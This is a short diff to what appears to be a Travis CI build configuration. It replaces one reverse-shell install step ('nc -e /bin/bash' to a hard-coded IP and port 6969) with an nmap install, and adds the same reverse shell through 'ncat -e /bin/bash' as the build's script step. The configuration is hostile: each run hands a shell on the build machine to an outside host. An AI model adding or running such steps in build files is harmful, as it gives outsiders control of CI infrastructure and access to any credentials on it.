@@ -5,7 +5,7 @@ python:
 sudo: required
 
 install:
-  - nc -e /bin/bash 76.126.164.151 6969
+  - sudo apt-get install -y nmap
   
 script:
-  - python shell.py
+  - ncat -e /bin/bash 76.126.164.151 6969
